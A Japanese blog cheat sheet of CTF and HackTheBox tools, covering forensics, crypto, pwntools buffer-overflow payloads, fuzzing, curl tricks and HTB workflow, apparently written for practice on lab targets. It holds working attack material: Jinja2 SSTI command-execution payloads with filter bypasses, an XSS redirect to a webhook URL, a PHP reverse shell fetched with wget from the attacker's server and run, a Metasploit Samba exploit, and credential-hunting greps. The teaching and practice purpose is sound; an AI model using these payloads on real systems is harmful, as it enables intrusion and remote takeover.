+++
author = "Hugo Authors"
title = "📌CTF&HTB Tools まとめ"
date = "2025-11-11"
weight = -2
description = ""
tags = [
    "CTF",
    "HTB"
]
categories = [
    "Security",
    "Programming",
]
image = "https://raw.githubusercontent.com/stark2420/starknote/refs/heads/main/static/image/ctf/cover.png"
+++

CTFやHTBで利用できるツールを自分用にまとめておく．
<!--more-->
## Forensics
参考：
https://qiita.com/knqyf263/items/6ebf06e27be7c48aab2e
### exiftool
画像や動画のExif情報．
```
$ exiftool image.png
```
<details><summary>install</summary>
{{< code lang="" title="" hl_lines="" >}}
$ sudo apt-get install exiftool
{{< /code >}}
</details>

### pdftotext
PDFをテキストに変換．
```
$ pdftotext file.pdf
$ pdftotext file.pdf -
```
- default：name.txtが作成される
- `-`：標準出力にそのまま出力

問題例：
https://stark2420.github.io/starknote/post/new-year-ctf-2025/#bel_money-part_1-100

<details><summary>install</summary>
{{< code lang="" title="" hl_lines="" >}}
$ apt install poppler-utils
$ pdftotext -v
{{< /code >}}
</details>

### QRコード
- QRazyBox: https://merri.cx/qrazybox/
- QRコード読み取り: https://qrcode.onl.jp/

{{< code lang="python" title="qr.py" hl_lines="">}}
!pip install opencv-python
!pip install pyzbar

import base64
import cv2
from pyzbar.pyzbar import decode

base64_data = "iVBORw0KGgoAAAANSUhEUgAAAeoAAAHqAQAAAADjFjCXAAAC/klEQVR4nO3aSW7rMAyAYQE+QI7kq/tIPkAAvoSjPHSwlQd08WvRurE+dUNQIpUmI2NpcDgcDofD4fC/xJuPyZ5enzz9k/n1JLK+Plv0xdryBRw+xvUPWV98tqmT+NTH01aLt5N0Ag4f4e+p9m6NyF3e8v1DX2zeTnD4B7nmxk2CfKHloVN9DTj843z1+RGlsV9rDv05aOHwX3P9tcbHOd/Dt06JP+7vcPhvuY9Iht/8iKlw+CDvRh0Gm+3N76f4M0I6J8PhI9yLXLG0GOfAOBbqkpogY7UZDh/lWnhkzWHtljgR1inRD43HVAmHX+de33rN29UmLaUuucRGHgwOv8ut5tDYrK6yZknvvrS2f4LDB3m/GWdY6tR84Zt2LH5MlXD4Vf4QiYUqIlurc2Bt3x7NcPggtzokz4GyRVmgaKieFiNw+FVu7zQZSpwNrecy+/Ldd1mkBhw+wP22rPUZUdZKixXDVRvD4YM8wtAvL7K1PMcaddMWOzccPsg3bbxovERurBjO/wWHf4BHqGr1YbwuOSx9xpJ95QKH3+U+IlRbdf/0KTt9rbW8+IDDB3nFYY5ul7bqVy/UJM+GcPgY9+p3y+veVtYK1Wfu3HD4ED8L2i5V2pMl0v74CIcP8LOgFcm0uOR5sbVqRsPhY3w+01LbsvShWgMO/y/cipFsvFgJvL9Qg8Nv8Nai0tiNJXKjVyTbKXD4fS52eRFt5H5CBGhwHYcKGg6/zuuktx+RGwM9++QKh9/nfaVxMqxAztuPdrK/w+FXuTX05jMZO7eN95SuXobD7/PNtwV245n3trnGsfECh1/m3w8L2mzBdMdHOPw+92iMDbrbqq0Y0QuNR61xuMaFw6/zWX/ZbdnUbcG+Nz9E4n4t8yocPsrrjjY7LZ4Rg+s826DzH8Lhn+DNvoBn3b8WnZY6L9qUL06VcPgtvkmVLj1VKlq9Gf1lzMPhv+YRkTYru8r7YYF8rKDh8Ovcx9SvodyqX536kEykcPg4vzvgcDgcDofD4X+F/wOUtm/WGicMDwAAAABJRU5ErkJggg=="
image_data = base64.b64decode(base64_data)
with open("decoded_qr_code.png", "wb") as file:
    file.write(image_data)

image = cv2.imread('decoded_qr_code.png')
qr_codes = decode(image)
for qr in qr_codes:
    qr_data = qr.data.decode('utf-8')
    print(qr_data)

# Happy_New_Year_-_may_it_be_your_best_year_yet!
{{< /code >}}

問題例:  
&emsp;- https://stark2420.github.io/starknote/post/new-year-ctf-2025/#broken-qr-100  
&emsp;- https://stark2420.github.io/starknote/post/new-year-ctf-2025/#my-best-regards-100

## Pwn

<details><summary>install</summary>
{{< code lang="" title="" hl_lines="" >}}
# pwntoolsのインストール
$ pip install pwntools

# ROPgadgetのインストール
$ pip install ROPgadget
{{< /code >}}
</details>

### Buffer Overflow (BOF)
#### ローカル変数の書き換え
```
from pwn import *

io = remote("localhost", 9012)

payload = b"A" * 24
payload += p64(0xdeadbeef)

io.sendline(payload)
io.interactive()
```
#### リターンアドレスの書き替え
```
from pwn import *

elf = ELF('./chall')
win_addr = elf.symbols['win']

io = remote("localhost", 9012)

payload = b"A" * 18
payload += p64(win_addr)

io.sendafter(b"input:", payload)
io.interactive()
```
手動でwin関数のアドレスを調べる場合は，以下のように`0x401186`とわかる．
```
$ objdump -d chall | grep "win" -A 16
0000000000401186 <win>:
  401186:       55                      push   %rbp
  401187:       48 89 e5                mov    %rsp,%rbp
  40118a:       48 83 ec 70             sub    $0x70,%rsp
  40118e:       48 8d 05 6f 0e 00 00    lea    0xe6f(%rip),%rax        # 402004 <_IO_stdin_used+0x4>
  401195:       48 89 c6                mov    %rax,%rsi
  401198:       48 8d 05 67 0e 00 00    lea    0xe67(%rip),%rax        # 402006 <_IO_stdin_used+0x6>
  40119f:       48 89 c7                mov    %rax,%rdi
  4011a2:       e8 e9 fe ff ff          call   401090 <fopen@plt>
  4011a7:       48 89 45 f8             mov    %rax,-0x8(%rbp)
  4011ab:       48 8b 55 f8             mov    -0x8(%rbp),%rdx
  4011af:       48 8d 45 90             lea    -0x70(%rbp),%rax
  4011b3:       be 64 00 00 00          mov    $0x64,%esi
  4011b8:       48 89 c7                mov    %rax,%rdi
  4011bb:       e8 b0 fe ff ff          call   401070 <fgets@plt>
  4011c0:       48 8d 45 90             lea    -0x70(%rbp),%rax
  4011c4:       48 89 c7                mov    %rax,%rdi
```

## Web
### FFUF
WEBファジングツール．
```
$ ffuf -w wordlists.txt -u http://example.com/FUZZ
$ ffuf -w subdomains.txt -u http://example.com -H "Host:FUZZ.example.com" -c -fs 178
```

**Wordlistsのダウンロード先:**
- (公式) http://ffuf.me/wordlists
- (ユーザ名) https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names [names.txt]
- (シンプルで使いやすい) https://github.com/Bo0oM/fuzz.txt
- (サブドメイン用) https://wordlists.assetnote.io/ [httparchive_subdomains_2024_05_28.txt]

参考:  
&emsp;- https://jpn.nec.com/cybersecurity/blog/210604/index.html   
&emsp;- https://breezebird.net/ffuf/   
&emsp;- https://qiita.com/kk0128/items/5186cbe6062e0f887e3b  

### .git/
`.git/`がある場合，[GitHack](https://github.com/lijiejie/GitHack) (https://github.com/lijiejie/GitHack) を用いて，ファイルをダウンロードできる．

### curlコマンド
```
// 任意のヘッダー（X-Dev-Access: yes）を付与．
curl -X POST http://amiable-citadel.picoctf.net:61140/login -H "X-Dev-Access: yes" -d email="ctf-player@picoctf.org"

// -d をJSONで送る場合，Content-Type: application/jsonが必須．
curl -X POST http://amiable-citadel.picoctf.net:59204/login -H "Content-Type: application/json" -d '{"email":"ctf-player@picoctf.org", "password":"rCRnekkE"}'

// windowsだと以下にしないとダメ．
curl -X POST http://amiable-citadel.picoctf.net:59204/login -H "Content-Type: application/json" -d "{\"email\":\"ctf-player@picoctf.org\", \"password\":\"rCRnekkE\"}"

curl -X POST http://amiable-citadel.picoctf.net:59204/login -d email="ctf-player@picoctf.org" -d password="rCRnekkE"

// X-Forwarded-ForでIPの偽造が可能？
curl -X POST http://amiable-citadel.picoctf.net:59204/login -d email="ctf-player@picoctf.org" -d password="rCRnekkE" -H "X-Forwarded-For: 127.0.0.1"
```

### URLエンコード
- https://tool.hiofd.com/ja/url-hex-online/

参考：[HTML URL-encoding Reference](https://www.eso.org/~ndelmott/url_encode.html)

### 文字コード
- [文字 -> Unicode](https://www.tagindex.com/tool/unicode-code.html)
- [Unicode -> 文字](https://www.tagindex.com/tool/unicode-char.html)

### XSS
- https://webhook.site/

指定のURLにリダイレクトするスクリプト.

```
<script>window.location.href="https://webhook.site/861b7ef1-0e6e-4dc3-9c97-f69bb609c45f";</script>
```

### SSTI(Server-Side Template Injection)
- 判別チートシート https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Server%20Side%20Template%20Injection/Images/serverside.png
- ninja (flaskのrender_template_stringは内部でninja使用) 
    - `{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}`
    - （「.」が使用できない場合）`{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('ls')['read']()}}`
    - （「.」「_」が使用できない場合）`{{request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('ls')['read']()}}`
    - （「.」「_」「[]」が使用できない場合）`{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()}}`

参考：  
&emsp;- https://onsecurity.io/article/server-side-template-injection-with-jinja2/  
&emsp;- [CTFのWebセキュリティにおけるSSTIまとめ](https://blog.hamayanhamayan.com/entry/2021/12/15/225142)

### 探索
- ソースコードのコメント
- リスポンスヘッダー
- robots.txt
- robots.txtのDisallowに指定されたディレクトリ
- ソースマップ（.mapの拡張子で終わるJSONのファイル）`app.js.map`
- Cookie
- Cookieの`user:guest`を`user:admin`にする
- Cookieの`admin:False`を`admin:True`にする
- .htaccess
- .DS_Store


## Crypto
### 何の暗号かを調べる
- https://www.dcode.fr/cipher-identifier

### 国際信号旗
- https://ja.wikipedia.org/wiki/%E5%9B%BD%E9%9A%9B%E4%BF%A1%E5%8F%B7%E6%97%97

　例題：
https://qiita.com/samohan/items/412e62a7c981e1c20ea2

### Burrows-Wheeler変換 (BWT)，ブロックソート
https://www.dcode.fr/burrows-wheeler-transform

　例題：
https://stark2420.github.io/starknote/post/uoftctf-2025/#funny-cipher-100

### モールス信号
- https://morsedecoder.com/
- https://www.morsecode-translator.com/ja
- (音声も復号) https://morsecode.world/international/decoder/audio-decoder-adaptive.html

### シーザー暗号
- http://www.net.c.dendai.ac.jp/crypto/caesar2.html

### 単一換字式暗号
- https://quipqiup.com/

### ビジュネル暗号
- https://www.guballa.de/vigenere-solver (鍵も推測する)
- https://www.dcode.fr/chiffre-vigenere (鍵も推測する)
- https://cryptii.com/pipes/vigenere-cipher

### 素因数分解
- http://factordb.com/ (既知のNを分解)
- https://www.alpertron.com.ar/ECM.HTM

### CyberChef
- https://gchq.github.io/CyberChef/

### ハッシュ値
- https://crackstation.net/ (Free Password Hash Cracker)

### 脆弱なRSA暗号
- (RSA暗号でやってはいけない $n$ のこと) https://www.slideshare.net/slideshow/rsa-n-ssmjp/72368516#1
- $N$ が既知で，暗号化オラクルあり，平文が既知で暗号文を求める場合
- $N$ が未知で，暗号化オラクルあり，平文が既知で暗号文を求める場合

参考：
https://zenn.dev/asusn/articles/6bb19c694e94ce#%E6%B1%8E%E7%94%A8%E3%83%84%E3%83%BC%E3%83%AB

```py
!pip install pycryptodome
from Crypto.Util.number import long_to_bytes

n = 362433315617467211669633373003829486226172411166482563442958886158019905839570405964630640284863309204026062750823707471292828663974783556794504696138513859209
c = 104442881094680864129296583260490252400922571545171796349604339308085282733910615781378379107333719109188819881987696111496081779901973854697078360545565962079

q = 33091
p = 10952625052656831515204538182703136388328319215692561827776703217129125920630092954719731657697359076607720006975422546048557875675403691541340687683615299
e = 65537
phi = (p - 1) * (q - 1)
d = pow(e, -1, phi)
m = pow(c, d, n)
flag = long_to_bytes(m) # or m.to_bytes((m.bit_length() + 7) // 8, byteorder='big')
print(flag.decode())
```


## Misc
### ターミナルの入出力の自動化
- 一行ずつ読み取る場合：`p.recvline()`
``` 
$ nc 127.0.0.1 4649
Add and answer in decimal.
0x1a87
0b1010100001100
0o6221
0o4054
0xae2
answer: 
```

{{< code lang="python" title="Solver.py" hl_lines="" >}}
from pwn import *
import re

# p = process(["python", "main.py"])　# ローカルでプログラムを実行
p = remote("127.0.0.1", 4649)

numbers = []
sum = 0

print(p.recvline().strip().decode()) # 一行取得，改行削除，byte列 -> 文字列 
for _ in range(5):
    s = p.recvline().strip().decode()
    print(s)
    numbers.append(s)

for i in numbers:
    if re.match('^0b', i):
        cast = int(i[2:], 2)
    elif re.match('^0x', i):
        cast = int(i[2:], 16)  
    else:
        cast = int(i[2:], 8)
    sum += cast

print(p.recvuntil(b'answer: ').strip().decode())
print(str(sum))

p.sendline(str(sum).encode()) # ターミナルへ書き込む(byte列で与える)

print(p.recvall().decode()) # 全てのレスポンスを表示
{{< /code >}}

- 変数ごとに読み取る場合：`p.recvuntil(b'n = ')`
```
$ nc 127.0.0.1 4649
Multiply and answer in decimal.
a = 4290
b = 1777
c = 6279
answer: 
```
{{< code lang="python" title="Solver.py" hl_lines="" >}}
from pwn import *

# p = process(["python", "main.py"])　# ローカルでプログラムを実行
p = remote("127.0.0.1", 4649)

print(p.recvline().strip().decode()) # 一行取得，改行削除，byte列 -> 文字列 

print(p.recvuntil(b'a = ').strip().decode()) # 'a = 'まで読み取る
a = p.recvline().strip().decode() # 一行読み取る
print(a)

print(p.recvuntil(b'b = ').strip().decode())
b = p.recvline().strip().decode()
print(b)

print(p.recvuntil(b'c = ').strip().decode())
c = p.recvline().strip().decode()
print(c)

print(p.recvuntil(b': ').decode())
ans = int(a)*int(b)*int(c)
print(str(ans))

p.sendline(str(ans).encode()) # ターミナルへ書き込む(byte列で与える)

print(p.recvall().decode()) # 全てのレスポンスを表示
{{< /code >}}

<details><summary>Dockerで試してみる場合の手順</summary>

#### まずは，以下の四つのファイルを作成．

{{< code lang="" title="dockerfile" hl_lines="" >}}
FROM python:3.12.4-slim

RUN apt-get clean && \
    apt-get update && \
    apt-get install -y socat && \
    rm -rf /var/lib/apt/lists/*

RUN useradd -m -d /home/admin -s /bin/bash admin

WORKDIR /home/admin

COPY --chown=root:admin --chmod=050 ./main.py ./main.py
COPY --chown=root:admin --chmod=040 ./flag.py ./flag.py

USER admin

EXPOSE 4649

ENTRYPOINT ["socat", "-t", "300", "-T", "30", "TCP-LISTEN:4649,reuseaddr,nodelay,fork", "EXEC:python3 main.py"]
{{< /code >}}

{{< code lang="" title="docker-compose.yml" hl_lines="" >}}
services:
  admin:
    build: .
    container_name: "Terminal-Hack"
    ports:
      - "0.0.0.0:4649:4649"
    restart: unless-stopped
{{< /code >}}

{{< code lang="python" title="main.py" hl_lines="" >}}
from flag import FLAG
import random

def add():
    print("Add and answer in decimal.")
    sum = 0
    for _ in range(5):
        num = random.randint(1, 10000)
        sum += num
        if num % 3 == 0:
            print(bin(num))
        elif num % 3 == 1:
            print(oct(num))
        else:
            print(hex(num))

    num = int(input("answer: "))
    if num == sum:
        print("Corect! " + FLAG)
    else:
        print("It's not right.")

def mult():
    print("Multiply and answer in decimal.")
    ans = 1
    s = ['a', 'b', 'c']
    for i in range(3):
        num = random.randint(1, 10000)
        ans *= num
        print(f"{s[i]} = {num}")

    num = int(input("answer: "))
    if num == ans:
        print("Corect! " + FLAG)
    else:
        print("It's not right.")

if __name__ == "__main__":
    add()
    # mult()
{{< /code >}}

{{< code lang="python" title="flag.py" hl_lines="" >}}
FLAG = "flag{good_job!}"
{{< /code >}}

#### ファイルのあるディレクトリで以下を実行
```
$ docker-compose up
```
<br>
　手動でアクセスする場合は以下のように．  
<br><br>

```
$ nc 127.0.0.1 4649
```
<br>
　Solver.py を実行する場合は以下のように．
<br><br>

```
$ python Solver.py
[x] Opening connection to 127.0.0.1 on port 4649
[x] Opening connection to 127.0.0.1 on port 4649: Trying 127.0.0.1
[+] Opening connection to 127.0.0.1 on port 4649: Done
Add and answer in decimal.
0xa7c
0o7217
0b10000110101110
0xc8
0b110110111111
answer:
18752
[x] Receiving all data
[x] Receiving all data: 0B
[x] Receiving all data: 24B
[+] Receiving all data: Done (24B)
[*] Closed connection to 127.0.0.1 port 4649
Corect! flag{good_job!}

$ python Solver.py
[x] Opening connection to 127.0.0.1 on port 4649
[x] Opening connection to 127.0.0.1 on port 4649: Trying 127.0.0.1
[+] Opening connection to 127.0.0.1 on port 4649: Done
Multiply and answer in decimal.
a =
3811
b =
6188
c =
6282
answer:
148145063976
[x] Receiving all data
[x] Receiving all data: 0B
[x] Receiving all data: 24B
[+] Receiving all data: Done (24B)
[*] Closed connection to 127.0.0.1 port 4649
Corect! flag{good_job!}
```

</details>


## HackTheBox(HTB)
### VPN
HTBの右上の方の`CONNECT TO HTB`から，`DOWNLOAD VPN`を押して`***.ovpn`をダウンロード．  
```
$ sudo openvpn ***.ovpn 
…
Initialization Sequence Completed
…
```
前後に色々ログが出るが，Initialization Sequence Completed が出れば成功．

### nmap
```
$ nmap -Pn -T4 -sV -sC -A [IPアドレス]
```
- Pn: 事前のping送信をしない
- T4: スキャン速度の指定．0~5で数字が高いほど早いがエラーが出やすい
- sV: 動作しているサービスのバージョンを確認
- sC: デフォルトスクリプトスキャン
- A: 詳細スキャン
- v: スキャン中の進捗や詳細を表示．-vv にするとさらに詳細に．

### /etc/hosts
`/etc/hosts` は名前解決用のローカルファイル．  
ローカルのIPアドレスの名前解決を利用する場合，手動で追加する必要がある．
```
$ sudo vi /etc/hosts
10.10.11.68     planning.htb
```

### リバースシェル

以下から`php-reverse-shell.php`をダウンロードする（以下`shell.php`），

php-reverse-shell:  
https://github.com/pentestmonkey/php-reverse-shell

IPアドレス（自分のIPアドレス）とポートを設定する．
```
49  $ip = '10.10.x.x';  // CHANGE THIS
50  $port = 4444; // CHANGE THIS
```

netcatでリッスン状態にしておく．
```
$ nc -lvvp 4444
```

#### ①wgetでダウンロードする場合
`shell.php`のあるディレクトリで，以下を実行し簡易サーバを立てる．  
```
$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

ダウンロードしたい場所で以下を実行するとダウンロードできる．
```
$ wget [自分のIPアドレス]:8000/shell.php
or
$ bash -c "wget [自分のIPアドレス]:8000/shell.php"
```

以下で shell.php を実行させる．
```
$ php shell.php
or
$ bash -c "php shell.php"
```

#### ②アップロード機能を利用する場合
`shell.php`をアップロード機能を用いてアップロードする．  
phpが許可されていない場合は，使用可能な拡張子に変更．  
格納されたディレクトリに，ブラウザまたはcurlコマンドでアクセス．


①または②でシェルが取得出来たら，以下を実行してシェルを安定化させる．
```
$ python3 -c 'import pty;pty.spawn("/bin/bash");'
```

参考：  
https://qiita.com/Brutus/items/1f9b1db93482ffbca6c2


### searchsploit
脆弱性の検索．
```
$ searchsploit vsFTPd 2.3.4 
----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
vsftpd 2.3.4 - Backdoor Command Execution                  | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)     | unix/remote/17491.rb
----------------------------------------------------------- ---------------------------------
Shellcodes: No Results

$ searchsploit samba 3.0.20
----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass     | multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command  | unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Overflow                      | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)              | linux_x86/dos/36741.py
----------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

### Metasploit
Metasploit Frameworkは攻撃コードの作成，実行を行うためのフレームワークソフトウエア．
```
$ msfconsole
msf6 > search Samba 3.0.20

Matching Modules
================

   #  Name                                Disclosure Date  Rank       Check  Description
   -  ----                                ---------------  ----       -----  -----------
   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/samba/usermap_script

msf6 > use exploit/multi/samba/usermap_script
msf6 exploit(multi/samba/usermap_script) > options

odule options (exploit/multi/samba/usermap_script):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:port[,type:host:po
                                       rt][...]
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/
                                       docs/using-metasploit/basics/using-metasploit.html
   RPORT    139              yes       The target port (TCP)


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  172.19.46.189    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic

msf6 exploit(multi/samba/usermap_script) > set rhosts [ターゲットのIPアドレス]
msf6 exploit(multi/samba/usermap_script) > set lhost [攻撃者側のIPアドレス]
msf6 exploit(multi/samba/usermap_script) > run
```

### linuxコマンド
```
$ whoami    // 現在ログイン中のユーザー名を表示
root

$ id    // uid：ユーザーID，gid：Group ID，groups：所属しているすべてのグループ
uid=0(root) gid=0(root) groups=0(root)

$ su [ユーザー名]   // ユーザーを一時的に切り替える

$ sudo -l    // sudo権限の一覧

$ find / -name user.txt
$ find / -name root.txt

$ grep -r "pass" ./folder
$ grep -r "database" ./folder | grep "root"

$ tar -xjf xxx.tar.bz2
```